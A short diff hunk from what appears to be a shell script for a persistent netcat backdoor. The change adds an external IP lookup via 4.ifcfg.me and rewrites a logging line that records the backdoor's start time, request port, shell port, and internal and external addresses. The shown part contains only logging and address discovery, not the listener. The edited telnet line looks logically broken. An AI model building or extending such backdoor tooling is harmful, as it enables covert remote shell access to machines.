@@ -32,13 +32,14 @@ fi
 NOW=`date`
 CONECTIONS=1
 FAILED=1
+EXT_IP=`jping 4.ifcfg.me | cut -d' ' -f6`
 
 echo
 echo "[...] Netcat backdoor active since [$NOW]" >> persistentNC/persistentNCbackdoor.log
 echo "[...] Request port [12345]" >> persistentNC/persistentNCbackdoor.log
 echo "[...] Shell port [8080]" >> persistentNC/persistentNCbackdoor.log
 echo "[...] Internal address [`ifconfig wlan0 | awk '$1 == "inet" {print $2}'`]" >> persistentNC/persistentNCbackdoor.log
-echo "[...] External address [`telnet 4.ifcfg.me | grep IPv4 | cut -d' ' -f4`]" >> persistentNC/persistentNCbackdoor.log
+echo "[...] External address [`telnet $EXT_IP | grep IPv4 | cut -d' ' -f4`]" >> persistentNC/persistentNCbackdoor.log
 cat persistentNC/persistentNCbackdoor.log | tail -n-5
 echo
 
